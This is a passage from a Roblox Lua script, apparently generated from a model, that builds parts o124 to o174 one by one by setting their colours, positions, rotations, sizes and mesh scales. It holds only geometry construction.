o124.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o124.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o124.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o124.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o124.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o124.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o124.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o125 = Instance.new("BlockMesh")
o125.Parent = o124
o125.Scale = Vector3.new(0.333333343, 0.333333343, 0.25)
o126 = Instance.new("Part")
o126.Parent = o1
o126.Material = Enum.Material.SmoothPlastic
o126.BrickColor = BrickColor.new("Neon orange")
o126.Position = Vector3.new(-113.539955, 1.46897125, 61.1333237)
o126.Rotation = Vector3.new(90.0000076, -5.00833175e-006, -1.2209328e-010)
o126.Anchored = true
o126.CFrame = CFrame.new(-113.539955, 1.46897125, 61.1333237, 1, 2.13092976e-012, -8.74118768e-008, -8.74118768e-008, -1.04308192e-007, -1, -2.14004747e-012, 1, -1.04308192e-007)
o126.FormFactor = Enum.FormFactor.Custom
o126.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o126.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o126.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o126.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o126.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o126.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o126.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o126.Color = Color3.new(0.835294, 0.45098, 0.239216)
o127 = Instance.new("SpecialMesh")
o127.Parent = o126
o127.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o127.MeshType = Enum.MeshType.Wedge
o128 = Instance.new("Part")
o128.Parent = o1
o128.Material = Enum.Material.SmoothPlastic
o128.BrickColor = BrickColor.new("Really black")
o128.Position = Vector3.new(-113.539955, 1.34397781, 62.5949593)
o128.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o128.Anchored = true
o128.CFrame = CFrame.new(-113.539955, 1.34397781, 62.5949593, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o128.FormFactor = Enum.FormFactor.Custom
o128.Size = Vector3.new(0.200000003, 1.80666661, 0.200000003)
o128.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o128.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o128.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o128.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o128.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o128.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o128.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o129 = Instance.new("CylinderMesh")
o129.Parent = o128
o129.Scale = Vector3.new(0.166666672, 1, 0.166666672)
o130 = Instance.new("Part")
o130.Parent = o1
o130.Material = Enum.Material.SmoothPlastic
o130.BrickColor = BrickColor.new("Neon orange")
o130.Position = Vector3.new(-113.5373, 1.39128041, 58.5915298)
o130.Rotation = Vector3.new(2.50447852e-006, 2.50457879e-006, 4.2913037e-010)
o130.Anchored = true
o130.CFrame = CFrame.new(-113.5373, 1.39128041, 58.5915298, 1, -7.489738e-012, 4.37131469e-008, 8.24089842e-012, 0.999991596, -4.37110295e-008, -4.3712955e-008, 4.37110295e-008, 0.999991596)
o130.CanCollide = false
o130.FormFactor = Enum.FormFactor.Symmetric
o130.Size = Vector3.new(1, 1, 2)
o130.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o130.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o130.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o130.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o130.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o130.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o130.Color = Color3.new(0.835294, 0.45098, 0.239216)
o131 = Instance.new("SpecialMesh")
o131.Parent = o130
o131.Scale = Vector3.new(0.192307696, 0.115384616, 0.769230783)
o131.MeshType = Enum.MeshType.Wedge
o132 = Instance.new("Part")
o132.Parent = o1
o132.Material = Enum.Material.SmoothPlastic
o132.BrickColor = BrickColor.new("Really black")
o132.Position = Vector3.new(-113.539955, 1.24397194, 60.1083488)
o132.Rotation = Vector3.new(-90, -5.21097721e-010, -180)
o132.Anchored = true
o132.CFrame = CFrame.new(-113.539955, 1.24397194, 60.1083488, -1, 2.13516336e-012, -9.09487069e-012, -9.09487069e-012, -7.45058344e-008, 1, 2.13516271e-012, 1, 7.45058344e-008)
o132.FormFactor = Enum.FormFactor.Custom
o132.Size = Vector3.new(0.200000003, 1.43333328, 0.200000003)
o132.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o132.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o132.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o132.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o132.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o132.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o132.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o133 = Instance.new("SpecialMesh")
o133.Parent = o132
o133.Scale = Vector3.new(0.916666687, 1, 0.333333343)
o133.MeshType = Enum.MeshType.Wedge
o134 = Instance.new("Part")
o134.Parent = o1
o134.Material = Enum.Material.SmoothPlastic
o134.BrickColor = BrickColor.new("Neon orange")
o134.Position = Vector3.new(-113.539955, 1.32259893, 61.0306549)
o134.Rotation = Vector3.new(-14.9999905, 9.48099853e-007, 90)
o134.Anchored = true
o134.CFrame = CFrame.new(-113.539955, 1.32259893, 61.0306549, -4.37199184e-008, -1, 1.65474638e-008, 0.965925932, -3.79474017e-008, 0.258818895, -0.258818895, 2.72991603e-008, 0.965925932)
o134.FormFactor = Enum.FormFactor.Custom
o134.Size = Vector3.new(0.200000003, 0.200000003, 0.283333331)
o134.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o134.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o134.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o134.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o134.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o134.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o134.Color = Color3.new(0.835294, 0.45098, 0.239216)
o135 = Instance.new("BlockMesh")
o135.Parent = o134
o135.Scale = Vector3.new(0.583333313, 0.916666687, 1)
o136 = Instance.new("Part")
o136.Parent = o1
o136.Material = Enum.Material.SmoothPlastic
o136.BrickColor = BrickColor.new("Really black")
o136.Position = Vector3.new(-113.539955, 1.46064508, 63.6715851)
o136.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o136.Anchored = true
o136.CFrame = CFrame.new(-113.539955, 1.46064508, 63.6715851, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o136.FormFactor = Enum.FormFactor.Custom
o136.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o136.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o136.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o136.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o136.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o136.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o136.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o136.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o137 = Instance.new("BlockMesh")
o137.Parent = o136
o137.Scale = Vector3.new(0.333333343, 1, 0.25)
o138 = Instance.new("Part")
o138.Parent = o1
o138.Material = Enum.Material.SmoothPlastic
o138.BrickColor = BrickColor.new("Really black")
o138.Position = Vector3.new(-113.556625, 1.56064665, 60.2416763)
o138.Rotation = Vector3.new(-90, -5.00939223e-006, 180)
o138.Anchored = true
o138.CFrame = CFrame.new(-113.556625, 1.56064665, 60.2416763, -1, -8.74191883e-008, -8.74303865e-008, -8.74303652e-008, -1.34110536e-007, 1, -8.74191954e-008, 1, 1.34110536e-007)
o138.FormFactor = Enum.FormFactor.Custom
o138.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o138.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o138.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o138.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o138.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o138.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o138.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o138.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o139 = Instance.new("SpecialMesh")
o139.Parent = o138
o139.Scale = Vector3.new(0.5, 0.166666672, 0.333333343)
o139.MeshType = Enum.MeshType.Wedge
o140 = Instance.new("Part")
o140.Parent = o1
o140.Material = Enum.Material.SmoothPlastic
o140.BrickColor = BrickColor.new("Really black")
o140.Position = Vector3.new(-113.539955, 1.46897125, 62.2333107)
o140.Rotation = Vector3.new(90.0000076, -5.00833175e-006, -1.2209328e-010)
o140.Anchored = true
o140.CFrame = CFrame.new(-113.539955, 1.46897125, 62.2333107, 1, 2.13092976e-012, -8.74118768e-008, -8.74118768e-008, -1.04308192e-007, -1, -2.14004747e-012, 1, -1.04308192e-007)
o140.FormFactor = Enum.FormFactor.Custom
o140.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o140.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o140.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o140.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o140.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o140.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o140.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o140.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o141 = Instance.new("SpecialMesh")
o141.Parent = o140
o141.Scale = Vector3.new(0.333333343, 0.583333313, 0.25)
o141.MeshType = Enum.MeshType.Wedge
o142 = Instance.new("Part")
o142.Parent = o1
o142.Material = Enum.Material.SmoothPlastic
o142.BrickColor = BrickColor.new("Really black")
o142.Position = Vector3.new(-113.556625, 1.60230219, 60.4500046)
o142.Rotation = Vector3.new(90.0000076, 5.20843257e-010, 180)
o142.Anchored = true
o142.CFrame = CFrame.new(-113.556625, 1.60230219, 60.4500046, -1, -2.13694058e-012, 9.0904298e-012, -9.0904298e-012, 1.63912873e-007, -1, 2.13693885e-012, -1, -1.63912887e-007)
o142.FormFactor = Enum.FormFactor.Custom
o142.Size = Vector3.new(0.200000003, 0.449999988, 0.200000003)
o142.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o142.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o142.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o142.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o142.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o142.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o142.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o143 = Instance.new("BlockMesh")
o143.Parent = o142
o143.Scale = Vector3.new(0.5, 1, 0.0833333358)
o144 = Instance.new("Part")
o144.Parent = o1
o144.Material = Enum.Material.SmoothPlastic
o144.BrickColor = BrickColor.new("Neon orange")
o144.Position = Vector3.new(-113.5373, 1.23742986, 59.0915222)
o144.Rotation = Vector3.new(-180, -2.50457879e-006, -4.2913037e-010)
o144.Anchored = true
o144.CFrame = CFrame.new(-113.5373, 1.23742986, 59.0915222, 1, 7.489738e-012, -4.37131469e-008, 8.24089842e-012, -0.999991596, 4.37110295e-008, -4.3712955e-008, -4.37110295e-008, -0.999991596)
o144.CanCollide = false
o144.FormFactor = Enum.FormFactor.Symmetric
o144.Size = Vector3.new(1, 1, 1)
o144.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o144.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o144.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o144.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o144.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o144.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o144.Color = Color3.new(0.835294, 0.45098, 0.239216)
o145 = Instance.new("SpecialMesh")
o145.Parent = o144
o145.Scale = Vector3.new(0.192307696, 0.115384616, 0.538461566)
o145.MeshType = Enum.MeshType.Wedge
o146 = Instance.new("Part")
o146.Parent = o1
o146.Material = Enum.Material.SmoothPlastic
o146.BrickColor = BrickColor.new("Neon orange")
o146.Position = Vector3.new(-113.564957, 1.57730913, 61.6666527)
o146.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o146.Anchored = true
o146.CFrame = CFrame.new(-113.564957, 1.57730913, 61.6666527, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o146.FormFactor = Enum.FormFactor.Custom
o146.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o146.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o146.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o146.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o146.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o146.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o146.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o146.Color = Color3.new(0.835294, 0.45098, 0.239216)
o147 = Instance.new("CylinderMesh")
o147.Parent = o146
o147.Scale = Vector3.new(0.666666687, 0.25, 0.666666687)
o148 = Instance.new("Part")
o148.Parent = o1
o148.Material = Enum.Material.SmoothPlastic
o148.BrickColor = BrickColor.new("Neon orange")
o148.Position = Vector3.new(-113.539955, 1.37730265, 61.2333298)
o148.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o148.Anchored = true
o148.CFrame = CFrame.new(-113.539955, 1.37730265, 61.2333298, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o148.FormFactor = Enum.FormFactor.Custom
o148.Size = Vector3.new(0.200000003, 0.816666663, 0.200000003)
o148.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o148.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o148.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o148.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o148.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o148.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o148.Color = Color3.new(0.835294, 0.45098, 0.239216)
o149 = Instance.new("BlockMesh")
o149.Parent = o148
o149.Scale = Vector3.new(0.916666687, 1, 0.833333373)
o150 = Instance.new("Part")
o150.Parent = o1
o150.Material = Enum.Material.SmoothPlastic
o150.BrickColor = BrickColor.new("Really black")
o150.Position = Vector3.new(-113.539955, 1.52730358, 63.7299118)
o150.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o150.Anchored = true
o150.CFrame = CFrame.new(-113.539955, 1.52730358, 63.7299118, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o150.FormFactor = Enum.FormFactor.Custom
o150.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o150.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o150.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o150.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o150.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o150.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o150.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o150.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o151 = Instance.new("BlockMesh")
o151.Parent = o150
o151.Scale = Vector3.new(0.333333343, 0.0833333358, 0.416666687)
o152 = Instance.new("Part")
o152.Parent = o1
o152.Material = Enum.Material.SmoothPlastic
o152.BrickColor = BrickColor.new("Really black")
o152.Position = Vector3.new(-113.539955, 1.56564903, 60.8416634)
o152.Rotation = Vector3.new(90.0000076, 5.20458232e-010, -180)
o152.Anchored = true
o152.CFrame = CFrame.new(-113.539955, 1.56564903, 60.8416634, -1, 1.50991141e-007, 9.08370948e-012, -9.05445944e-012, 1.93715223e-007, -1, -1.50991127e-007, -1, -1.93715238e-007)
o152.FormFactor = Enum.FormFactor.Custom
o152.Size = Vector3.new(0.200000003, 0.333333343, 0.200000003)
o152.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o152.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o152.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o152.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o152.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o152.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o152.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o153 = Instance.new("BlockMesh")
o153.Parent = o152
o153.Scale = Vector3.new(0.666666687, 1, 0.666666687)
o154 = Instance.new("Part")
o154.Parent = o1
o154.Material = Enum.Material.SmoothPlastic
o154.BrickColor = BrickColor.new("Really black")
o154.Position = Vector3.new(-113.539955, 1.02732003, 59.8650208)
o154.Rotation = Vector3.new(-89.9999924, -5.91999378e-006, 180)
o154.Anchored = true
o154.CFrame = CFrame.new(-113.539955, 1.02732003, 59.8650208, -1, -1.50991156e-007, -1.0332338e-007, -1.03323345e-007, -2.23517574e-007, 1, -1.5099117e-007, 1, 2.23517574e-007)
o154.FormFactor = Enum.FormFactor.Custom
o154.Size = Vector3.new(0.200000003, 0.233333334, 0.200000003)
o154.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o154.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o154.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o154.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o154.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o154.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o154.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o155 = Instance.new("BlockMesh")
o155.Parent = o154
o155.Scale = Vector3.new(0.833333373, 1, 0.166666672)
o156 = Instance.new("Part")
o156.Parent = o1
o156.Material = Enum.Material.SmoothPlastic
o156.BrickColor = BrickColor.new("Really black")
o156.Position = Vector3.new(-113.539955, 1.54396701, 59.4333611)
o156.Rotation = Vector3.new(90.0000153, 5.00939313e-006, 180)
o156.Anchored = true
o156.CFrame = CFrame.new(-113.539955, 1.54396701, 59.4333611, -1, -2.13552136e-012, 8.74304007e-008, -8.74304007e-008, 2.68221214e-007, -1, 2.11207028e-012, -1, -2.68221214e-007)
o156.FormFactor = Enum.FormFactor.Custom
o156.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o156.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o156.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o156.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o156.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o156.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o156.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o156.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o157 = Instance.new("SpecialMesh")
o157.Parent = o156
o157.Scale = Vector3.new(0.666666687, 0.416666687, 0.666666687)
o157.MeshType = Enum.MeshType.Wedge
o158 = Instance.new("Part")
o158.Parent = o1
o158.Material = Enum.Material.SmoothPlastic
o158.BrickColor = BrickColor.new("Really black")
o158.Position = Vector3.new(-113.539955, 1.67565107, 60.8250008)
o158.Rotation = Vector3.new(92.0000153, 5.24563802e-006, -180)
o158.Anchored = true
o158.CFrame = CFrame.new(-113.539955, 1.67565107, 60.8250008, -1, 1.50990815e-007, 9.15536518e-008, -8.62283471e-008, 0.0348996483, -0.999390841, -1.54094025e-007, -0.999390841, -0.0348996483)
o158.FormFactor = Enum.FormFactor.Custom
o158.Size = Vector3.new(0.200000003, 0.300000012, 0.200000003)
o158.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o158.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o158.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o158.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o158.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o158.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o158.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o159 = Instance.new("BlockMesh")
o159.Parent = o158
o159.Scale = Vector3.new(0.5, 1, 0.0833333358)
o160 = Instance.new("Part")
o160.Parent = o1
o160.Material = Enum.Material.SmoothPlastic
o160.BrickColor = BrickColor.new("Really black")
o160.Position = Vector3.new(-113.539955, 1.48563671, 60.9749908)
o160.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o160.Anchored = true
o160.CFrame = CFrame.new(-113.539955, 1.48563671, 60.9749908, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o160.FormFactor = Enum.FormFactor.Custom
o160.Size = Vector3.new(0.200000003, 0.300000012, 0.200000003)
o160.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o160.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o160.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o160.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o160.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o160.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o160.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o161 = Instance.new("BlockMesh")
o161.Parent = o160
o161.Scale = Vector3.new(0.916666687, 1, 0.25)
o162 = Instance.new("Part")
o162.Parent = o1
o162.Material = Enum.Material.SmoothPlastic
o162.BrickColor = BrickColor.new("Really black")
o162.Position = Vector3.new(-113.569962, 1.64896476, 63.7049255)
o162.Rotation = Vector3.new(-90, -24.9996357, 2.5930288e-007)
o162.Anchored = true
o162.CFrame = CFrame.new(-113.569962, 1.64896476, 63.7049255, 0.906310558, -4.10167988e-009, -0.422612488, 0.422612488, 1.3219875e-007, 0.906310558, 5.21514458e-008, -1, 1.21546535e-007)
o162.FormFactor = Enum.FormFactor.Custom
o162.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o162.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o162.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o162.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o162.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o162.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o162.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o162.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o163 = Instance.new("BlockMesh")
o163.Parent = o162
o163.Scale = Vector3.new(0.0416666679, 0.333333343, 0.166666672)
o164 = Instance.new("Part")
o164.Parent = o1
o164.Material = Enum.Material.SmoothPlastic
o164.BrickColor = BrickColor.new("Really black")
o164.Position = Vector3.new(-113.539955, 1.12770569, 59.7194443)
o164.Rotation = Vector3.new(-20.9999943, 7.03878584e-007, 5.00940268e-006)
o164.Anchored = true
o164.CFrame = CFrame.new(-113.539955, 1.12770569, 59.7194443, 1, -8.74305712e-008, 1.22849988e-008, 7.72209248e-008, 0.933580458, 0.358367831, -4.28013394e-008, -0.358367831, 0.933580458)
o164.FormFactor = Enum.FormFactor.Custom
o164.Size = Vector3.new(0.200000003, 0.233333334, 0.200000003)
o164.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o164.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o164.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o164.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o164.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o164.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o164.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o165 = Instance.new("BlockMesh")
o165.Parent = o164
o165.Scale = Vector3.new(0.833333373, 1, 0.166666672)
o166 = Instance.new("Part")
o166.Parent = o1
o166.Material = Enum.Material.SmoothPlastic
o166.BrickColor = BrickColor.new("Neon orange")
o166.Position = Vector3.new(-113.539955, 1.46897221, 61.5666542)
o166.Rotation = Vector3.new(90.0000153, 5.00935221e-006, 180)
o166.Anchored = true
o166.CFrame = CFrame.new(-113.539955, 1.46897221, 61.5666542, -1, -2.1435733e-012, 8.74296902e-008, -8.74296902e-008, 2.38418806e-007, -1, 2.12272821e-012, -1, -2.38418806e-007)
o166.FormFactor = Enum.FormFactor.Custom
o166.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o166.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o166.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o166.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o166.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o166.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o166.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o166.Color = Color3.new(0.835294, 0.45098, 0.239216)
o167 = Instance.new("SpecialMesh")
o167.Parent = o166
o167.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o167.MeshType = Enum.MeshType.Wedge
o168 = Instance.new("Part")
o168.Parent = o1
o168.Material = Enum.Material.SmoothPlastic
o168.BrickColor = BrickColor.new("Neon orange")
o168.Position = Vector3.new(-113.539955, 1.46897125, 61.3999939)
o168.Rotation = Vector3.new(90.0000076, -5.00841907e-006, -1.11534677e-010)
o168.Anchored = true
o168.CFrame = CFrame.new(-113.539955, 1.46897125, 61.3999939, 1, 1.94664727e-012, -8.74134045e-008, -8.74119266e-008, -1.1920865e-007, -0.999991596, -2.13294204e-012, 0.999991596, -1.1920865e-007)
o168.FormFactor = Enum.FormFactor.Custom
o168.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o168.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o168.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o168.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o168.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o168.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o168.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o168.Color = Color3.new(0.835294, 0.45098, 0.239216)
o169 = Instance.new("SpecialMesh")
o169.Parent = o168
o169.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o169.MeshType = Enum.MeshType.Wedge
o170 = Instance.new("Part")
o170.Parent = o1
o170.Material = Enum.Material.SmoothPlastic
o170.BrickColor = BrickColor.new("Really black")
o170.Position = Vector3.new(-113.576622, 1.67397296, 63.7049255)
o170.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o170.Anchored = true
o170.CFrame = CFrame.new(-113.576622, 1.67397296, 63.7049255, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o170.FormFactor = Enum.FormFactor.Custom
o170.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o170.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o170.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o170.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o170.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o170.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o170.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o170.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o171 = Instance.new("BlockMesh")
o171.Parent = o170
o171.Scale = Vector3.new(0.0416666679, 0.333333343, 0.116666667)
o172 = Instance.new("Part")
o172.Parent = o1
o172.Material = Enum.Material.SmoothPlastic
o172.BrickColor = BrickColor.new("Really black")
o172.Position = Vector3.new(-113.581627, 1.53563416, 60.233345)
o172.Rotation = Vector3.new(90.0000534, 5.02050989e-006, -180)
o172.Anchored = true
o172.CFrame = CFrame.new(-113.581627, 1.53563416, 60.233345, -1, 1.50991113e-007, 8.76244286e-008, -8.76243078e-008, 8.19564661e-007, -1, -1.50991184e-007, -1, -8.19564661e-007)
o172.FormFactor = Enum.FormFactor.Custom
o172.Size = Vector3.new(0.200000003, 0.883333325, 0.200000003)
o172.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o172.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o172.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o172.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o172.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o172.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o172.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o173 = Instance.new("BlockMesh")
o173.Parent = o172
o173.Scale = Vector3.new(0.0833333358, 1, 0.583333313)
o174 = Instance.new("Part")
o174.Parent = o1
o174.Material = Enum.Material.SmoothPlastic
o174.BrickColor = BrickColor.new("Really black")
o174.Position = Vector3.new(-113.539955, 1.66896427, 63.7049255)
o174.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o174.Anchored = true
